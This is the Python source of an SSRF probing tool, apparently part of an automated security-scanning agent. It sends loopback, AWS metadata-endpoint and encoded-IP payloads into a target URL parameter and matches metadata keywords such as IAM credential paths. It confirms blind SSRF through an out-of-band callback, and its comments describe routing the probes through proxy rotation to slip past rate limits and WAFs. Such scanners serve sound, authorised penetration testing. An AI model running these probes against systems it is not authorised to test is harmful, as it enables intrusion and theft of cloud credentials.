"""TOOL: ssrf_test - SSRF detection tool."""
import json, time, urllib.parse
from tools import register
from tools._transport import fetch
from tools.oob_channel import (oob_url, register as oob_register,
                               receipt as oob_receipt, embed_hint)

PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0",
    "http://2130706433",
]

AWS_METADATA_KEYWORDS = [
    "ami-id",
    "instance-id",
    "local-ipv4",
    "public-ipv4",
    "security-groups",
    "instance-type",
    "iam/security-credentials",
    "ami-manifest-path",
    "reservation-id"
]

BASELINE_URL = "http://example.com"

# WC1 (audit-2 C1): the old private urlopen bypassed the hardened
# transport — no DoH, no proxy rotation, no adaptive pacing, no redirect
# tracking. SSRF probes were the ONLY unarmored requests in the fleet
# and got rate-limited/WAF-blocked while every other tool sailed.
def _send_req(url, timeout=10):
    t0 = time.time()
    r = fetch(url, timeout=timeout, use_cache=False)
    return (r.get("status", -1), r.get("body") or "",
            round(time.time() - t0, 3))

@register(
    name="ssrf_probe",
    desc="Probe URL parameters for Server-Side Request Forgery (SSRF) against loopback, cloud metadata, and alternate IP representations.",
    params={
        "type": "object",
        "properties": {
            "url_template": {
                "type": "string",
                "description": "Target URL with {INJ} placeholder (e.g. https://target.com/proxy?url={INJ}) — {PAYLOAD} also accepted"
            },
            "timeout": {
                "type": "integer",
                "default": 10,
                "description": "Request timeout in seconds (default: 10)"
            }
        },
        "required": ["url_template"]
    }
)
def ssrf_probe(url_template, timeout=10):
    # V10 (audit-3.2): the tool demanded {PAYLOAD} while the doctrine,
    # MCTS and every other tool speak {INJ} — the agent following doctrine
    # was refused, burned 3 heals, abandoned. Both spellings accepted.
    if "{INJ}" in url_template:
        url_template = url_template.replace("{INJ}", "{PAYLOAD}")
    if "{PAYLOAD}" not in url_template:
        return json.dumps({
            "error": "url_template must contain the {INJ} (or {PAYLOAD}) placeholder",
            "url_template": url_template
        })

    # Baseline request with neutral external URL
    base_url = url_template.replace("{PAYLOAD}", urllib.parse.quote(BASELINE_URL, safe=""))
    base_status, base_body, base_time = _send_req(base_url, timeout=timeout)
    base_len = len(base_body)

    tested_results = []
    suspected_vectors = []

    # ── OOB lane (Phase 0.1, nuclei interactsh architecture): a blind
    # SSRF often shows ZERO inline differential — the only proof is the
    # target's runtime making contact with infrastructure WE control.
    # Freeze the detection predicate BEFORE firing (nuclei RequestEvent),
    # embed the unique interaction URL in the payload set, and after the
    # volley check whether the callback landed. Without it, a suspected
    # vector is a HYPOTHESIS (law #2: no verdict without proof).
    host = urllib.parse.urlsplit(
        url_template.replace("{PAYLOAD}", "")).netloc or "unknown"
    oob_tag = "ssrf"
    oob = embed_hint(oob_tag, host)
    oob_register(oob_tag, host,
                 lambda inter: inter.get("protocol") in ("dns", "http", "https"),
                 context={"url_template": url_template})
    oob_payload = oob["url"]

    for payload in PAYLOADS + [f"http://{oob_payload}"]:
        target_url = url_template.replace("{PAYLOAD}", urllib.parse.quote(payload, safe=""))
        status, body, dt = _send_req(target_url, timeout=timeout)
        body_len = len(body)
        signals = []

        # Check status code diff
        if status != -1 and status != base_status:
            signals.append(f"status_diff({status} vs baseline {base_status})")

        # Check response time anomaly (internal target responds significantly faster or slower)
        if base_time > 0:
            if dt < (base_time * 0.4) and (base_time - dt) > 0.5:
                signals.append(f"fast_response_anomaly({dt}s vs baseline {base_time}s)")
            elif dt > (base_time * 2.5) and dt > 3.0:
                signals.append(f"slow_response_anomaly({dt}s vs baseline {base_time}s)")

        # Check body length diff
        if abs(body_len - base_len) > 50 and status != -1:
            signals.append(f"body_length_diff({body_len} vs baseline {base_len})")

        # Check AWS metadata leaks
        body_lower = body.lower()
        matched_meta = [kw for kw in AWS_METADATA_KEYWORDS if kw in body_lower]
        if matched_meta:
            signals.append(f"cloud_metadata_match({','.join(matched_meta)})")

        res = {
            "payload": payload,
            "status": status,
            "response_time_s": dt,
            "body_length": body_len,
            "signals": signals,
            "body_sample": body[:200] if signals else ""
        }
        tested_results.append(res)

        if signals:
            suspected_vectors.append({
                "payload": payload,
                "signals": signals
            })

    # WC2 (audit-2 C2): the verdict was a bare STRING — the bandit reward,
    # the Living Graph and the coverage system ALL look for the
    # "exploitable" field, so every SSRF finding was invisible to the
    # entire intelligence pipeline. Now the field exists and is honest:
    # metadata leak or multiple concurrent signals = exploitable.
    _meta_leak = any("cloud_metadata_match" in (v.get("signals") or [])
                     for v in suspected_vectors)
    _oob_rec = oob_receipt(oob_tag, host)
    _inline = bool(suspected_vectors) and (
        _meta_leak or len(suspected_vectors) >= 2)
    # law #2 (Ultimate plan): a BLIND verdict needs the callback. Inline
    # signals alone keep it a hypothesis; the OOB receipt upgrades it to
    # CONFIRMED with a proof object no rival scanner can contest.
    _exploitable = _inline or bool(_oob_rec)

    return json.dumps({
        "tool": "ssrf_probe",
        "url_template": url_template,
        "baseline": {
            "payload": BASELINE_URL,
            "status": base_status,
            "response_time_s": base_time,
            "body_length": base_len
        },
        "oob": {"url": oob_payload, "callback_received": bool(_oob_rec),
                "proof": (_oob_rec or {}).get("proof") if _oob_rec else None},
        "tested_payloads": tested_results,
        "signals_found": len(suspected_vectors),
        "suspected_ssrf_vectors": suspected_vectors,
        "exploitable": _exploitable,
        "proof_object": _oob_rec,
        "verdict": ("SSRF CONFIRMED via OOB callback — the target's runtime "
                    "contacted our interaction URL" if _oob_rec else
                    "SSRF CONFIRMED — server-side fetch of internal/metadata "
                    "resource observed" if _inline else
                    "potential SSRF signals detected (hypothesis — no OOB "
                    "callback yet)" if suspected_vectors
                    else "no obvious SSRF indicators")
    }, ensure_ascii=False, indent=1)
